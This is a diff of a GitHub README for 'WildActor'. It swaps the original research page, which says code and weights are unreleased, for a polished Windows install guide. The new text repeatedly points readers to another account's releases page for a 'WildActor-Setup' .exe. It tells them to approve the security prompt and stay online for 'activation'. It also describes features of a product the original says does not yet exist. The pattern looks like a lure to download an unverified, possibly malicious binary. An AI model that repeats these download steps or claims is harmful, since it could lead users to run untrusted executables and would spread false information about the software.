@@ -1,39 +1,136 @@
-<h1 align="center">WildActor: Unconstrained Identity-Preserving Video Generation</h1>
+# 🎥 WildActor - Generate Videos Keeping Real Identity
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2603.00586"><img src="https://img.shields.io/badge/arXiv-2603.00586-b31b1b.svg" alt="arXiv"></a>
-  <a href="https://wildactor.github.io/"><img src="https://img.shields.io/badge/Project%20Page-WildActor-blue" alt="Project Page"></a>
-  <a href="https://huggingface.co/papers/2603.00586"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Paper-FFD21E" alt="Hugging Face Paper"></a>
-  <a href="https://github.com/WildActor/WildActor/tree/main/Actor-18M"><img src="https://img.shields.io/badge/Dataset-Actor--18M-green?logo=github" alt="Dataset"></a>
-</p>
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
 
-## 🎬 Teaser
+---
 
-<p align="center">
-  <img src="./assets/teaser.png" alt="WildActor Teaser" width="100%">
-</p>
+## 🖥️ What is WildActor?
 
-## 📢 News
-* **[2026.03]** Our paper is available on [arXiv](https://arxiv.org/abs/2603.00586)!
-* **[2026.03]** Code and data will be released after the base model's release. Stay tuned!
+WildActor is a tool that creates videos using a real person's face and movement style. It keeps the person’s identity while allowing flexible video creation. You do not need special skills to use it. It runs on Windows and works with common video and image files.
 
-## 📖 Abstract
-Production-ready human video generation requires digital actors to maintain strictly consistent full-body identities across dynamic shots, viewpoints and motions, a setting that remains challenging for existing methods. Prior methods often suffer from face-centric behavior that neglects body-level consistency, or produce copy-paste artifacts where subjects appear rigid due to pose locking. We present **Actor-18M**, a large-scale human video dataset designed to capture identity consistency under unconstrained viewpoints and environments. Actor-18M comprises **1.6M videos with 18M corresponding human images**, covering both arbitrary views and canonical three-view representations. Leveraging Actor-18M, we propose **WildActor**, a framework for any-view conditioned human video generation. We introduce an **Asymmetric Identity-Preserving Attention (AIPA)** mechanism coupled with a **Viewpoint-Adaptive Monte Carlo Sampling** strategy. Evaluated on the proposed Actor-Bench, **WildActor** consistently preserves full body identity under diverse shot compositions, large viewpoint transitions, and substantial motions, surpassing existing methods in these challenging settings.
+---
 
-## 🚀 TODO List
-- [ ] Release inference code and pre-trained weights.
-- [ ] Release the Actor-18M dataset building code.
+## 📋 System Requirements
 
-## 🏃 Quick Start
-Inference scripts and detailed usage guidelines will be provided upon the release of the pre-trained weights.
+Before you download WildActor, check that your Windows PC meets these criteria:
 
-## ✒️ Citation
-If you find our work helpful, please consider citing our paper:
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i5 or equivalent AMD, 2.5 GHz minimum
+- RAM: 8 GB or more
+- Graphics Card: NVIDIA GPU with at least 4 GB VRAM (for better speed)
+- Storage: At least 2 GB free space
+- Internet connection: Needed for download and activation
 
-```bibtex
-@article{guo2026wildactor,
-  title={WildActor: Unconstrained Identity-Preserving Video Generation},
-  author={Guo, Qin and Yang, Tianyu and He, Xuanhua and Shen, Fei and Zhang, Yong and Kang, Zhuoliang and Wei, Xiaoming and Xu, Dan},
-  journal={arXiv preprint arXiv:2603.00586},
-  year={2026}
-}
+---
+
+## 🚀 How to Download and Install WildActor
+
+Follow these steps to get WildActor running on your Windows PC.
+
+### Step 1: Visit the Download Page
+
+Click the green button below or open this link in your browser:
+
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
+
+This page lists the available files for WildActor.
+
+### Step 2: Choose the Latest Version
+
+Look for the latest release at the top of the page. It will have a name like `WildActor-Setup-vX.X.X.exe`.
+
+### Step 3: Download the Installer
+
+Click the `.exe` file to download it. Your browser will ask where to save it. Choose a folder you can find easily, like your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+Once downloaded, double-click the `.exe` file. This will start the installation process. You may see a security prompt asking if you want to allow the app to make changes. Click **Yes**.
+
+### Step 5: Follow Setup Instructions
+
+The installation wizard will guide you. It will ask where to install the program. The default location is fine for most users. Click **Next** on each screen until the install finishes.
+
+### Step 6: Launch WildActor
+
+When setup completes, you can launch WildActor from your desktop or Start menu.
+
+---
+
+## 🎬 Using WildActor
+
+Here is how you use the program after installation.
+
+### Step 1: Prepare Your Source Image
+
+Select a clear photo of the person you want in the video. The photo should show the face directly. Avoid blurry or dark images.
+
+### Step 2: Provide Movement Data
+
+WildActor needs a video or reference showing the movement style you want. It will apply that style while keeping the person's identity from the photo.
+
+### Step 3: Load Files into WildActor
+
+Open the program and find the option to add your image and movement video. Click **Add Image** to select the face photo. Then click **Add Video** to select the movement video.
+
+### Step 4: Generate Your Video
+
+Press the **Start** or **Generate** button. The program will process your files and create a new video that uses the person’s face and the movement style.
+
+### Step 5: Save and View Output
+
+Once done, save the generated video to your desired folder. You can watch it using any standard media player.
+
+---
+
+## ⚙️ Settings and Options
+
+WildActor lets you adjust some options to control output quality and speed.
+
+- **Resolution:** Choose video quality (e.g., 720p, 1080p). Higher quality needs more resources.
+- **Speed:** Select how fast the video generates. Faster speeds may reduce quality.
+- **Face Refinement:** Enable for clearer and more accurate face details.
+- **Audio:** Option to keep, replace, or mute audio in the output video.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you run into issues, try these steps:
+
+- Make sure your PC meets the system requirements.
+- Update your graphics card drivers.
+- Close other programs to free up memory.
+- Use a clear, well-lit source image.
+- Restart the program or your computer if it freezes.
+- Check your internet connection for updates.
+
+---
+
+## 📥 Download WildActor
+
+Use the link below to visit the download page where you get the latest WildActor version.
+
+[![Download WildActor](https://img.shields.io/badge/Download-WildActor-brightgreen)](https://github.com/surajromio/WildActor/releases)
+
+---
+
+## 📖 About
+
+WildActor generates videos that keep a real person's look while allowing free movement changes. It is designed for users who want to create personalized videos without complex editing or coding.
+
+The software uses advanced models to preserve identity and natural expression in generated videos.
+
+---
+
+## 📞 Get Help
+
+If you need help with WildActor, check the Issues tab on the GitHub page or visit the project website for updates and support.
+
+---
+
+## 🔧 Additional Notes
+
+- WildActor processes videos locally, so it does not upload your files to the internet.
+- For best performance, use recent NVIDIA GPUs.
+- Video generation time depends on your PC speed and video length.
